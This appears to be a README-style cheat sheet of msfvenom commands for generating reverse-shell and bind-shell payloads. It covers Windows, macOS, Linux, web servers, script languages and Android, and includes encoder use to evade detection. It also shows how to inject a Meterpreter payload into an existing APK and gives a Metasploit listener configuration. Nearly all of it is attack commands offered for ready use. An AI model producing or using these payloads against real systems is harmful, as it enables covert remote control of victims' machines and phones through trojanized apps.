# Payloads
Android and different os payloads easy to modify and inject

<h2>Cheetsheet Metasploit</h2>

Windows Payloads
Windows Meterpreter Reverse Shell

<pre><code> msfvenom -p windows/meterpreter/reverse_tcp lhost=ip-address lport=port -f exe > payload-name.exe </code></pre>

Windows Reverse Shell
<pre><code> msfvenom -p windows/shell/reverse_tcp lhost=ip-address lport=port -f exe > payload-name.exe </code></pre>

Windows Encoded Meterpreter Reverse Shell
<pre><code> msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 2 -f exe > payload-name.exe </code></pre>

Windows Meterpreter Reverse Shellcode
<pre><code> msfvenom -p windows/meterpreter/reverse_tcp lhost=ip-address lport=port -f < platform  </code></pre>

macOS Payloads
macOS Bind Shell
<pre><code> msfvenom -p osx/x86/shell_bind_tcp rhost=ip-address lport=port-f macho > payload-name.macho </code></pre>

macOS Reverse Shell
<pre><code> msfvenom -p osx/x86/shell_reverse_tcp lhost=ip-address lport=port -f macho > payload-name.macho </code></pre>

macOS Reverse TCP Shellcode
<pre><code> msfvenom -p osx/x86/shell_reverse_tcp lhost=ip-address lport=port -f < platform  </code></pre>

Linux Payloads
Linux Meterpreter TCP Reverse Shell
<pre><code> msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=ip-address lport=port -f elf > payload-name.elf </code></pre>

Linux Bind TCP Shell
<pre><code> msfvenom -p generic/shell_bind_tcp rhost=ip-address lport=port -f elf > payload-name.elf </code></pre>

Linux Bind Meterpreter TCP Shell
<pre><code> msfvenom -p linux/x86/meterpreter/bind_tcp rhost=ip-address lport=port -f elf > payload-name.elf </code></pre>

Linux Meterpreter Reverse Shellcode
<pre><code> msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=ip-address lport=port -f < platform  </code></pre>

Web-base Payloads
PHP Meterpreter Reverse Shell
<pre><code> msfvenom -p php/meterpreter_reverse_tcp lhost=ip-address LPORT=port -f raw > payload-name.php </code></pre>

JSP Java Meterpreter Reverse Shell
<pre><code> msfvenom -p java/jsp_shell_reverse_tcp lhost=ip-address lport=port -f raw > payload-name.jsp </code></pre>

ASP Meterpreter Reverse Shell
<pre><code> msfvenom -p windows/meterpreter/reverse_tcp lhost=ip-address lport=port -f asp > payload-nmae.asp </code></pre>

WAR Reverse TCP Shell
<pre><code> msfvenom -p java/jsp_shell_reverse_tcp lhost=ip-address lport=port -f war > payload-name.war </code></pre>

Script-Base Payloads
Perl Unix Reverse shell
<pre><code> msfvenom -p cmd/unix/reverse_perl lhost=ip-address lport=port -f raw > payload-name.pl </code></pre>

Bash Unix Reverse Shell
<pre><code> msfvenom -p cmd/unix/reverse_bash lhost=ip-address lport=port -f raw > payload-name.sh </code></pre>

Python Reverse Shell
<pre><code> msfvenom -p cmd/unix/reverse_python lhost=ip-address lport=port -f raw > payload-name.py </code></pre>

Android Payloads
Android Meterpreter reverse Payload
<pre><code> msfvenom -p android/meterpreter/reverse_tcp lhost=ip-address lport=port R > payload-name.apk </code></pre>

Android Bind Meterpreter Payload
<pre><code> msfvenom -x app.apk -p android/meterpreter/reverse_tcp lhost=192.168.1.10 lport=4444 -o out.apk </code></pre>
<pre><code>msfvenom --platform android --arch dalvik -x myApp.apk -p android/meterpreter/reverse_tcp LHOST=192.168** LPORT=7777 -o build.apk</code></pre>

#Save AS explort.rc
Run command 


<pre><code>
# msfconsole -q -r 'export.rc'
# nano export.r
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 5576
set ExitOnSession false
set EnableStageEncoding true
run -j
</code></pre>

..........................................<a href="https://uk2blogger.blogspot.com/2021/03/best-way-to-generate-metasploit.html">read more</a>


